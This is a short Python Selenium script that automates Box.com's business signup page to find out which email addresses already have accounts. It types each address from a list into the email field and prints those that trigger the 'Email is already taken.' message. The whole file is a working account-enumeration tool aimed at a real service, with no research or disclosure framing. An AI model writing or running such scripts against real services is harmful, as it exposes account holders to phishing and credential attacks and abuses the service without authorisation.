from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff


print("The usernames present in Box.com are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["superman@gmail.com", "priyasdsdanka@gmail.com", "batman@gmail.com", "asjdbkajsdnkjas@gmail.com", "spiderman@gmail.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://account.box.com/signup/business#eg3o5")
    p1 = driver.page_source
    sleep(3)
    #elem=driver.find_element_by_xpath("//input[@type='email']")
    elem=driver.find_element_by_name("email")
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "Email is already taken." in p3:
        print(i)
    sleep(2)
    driver.close()
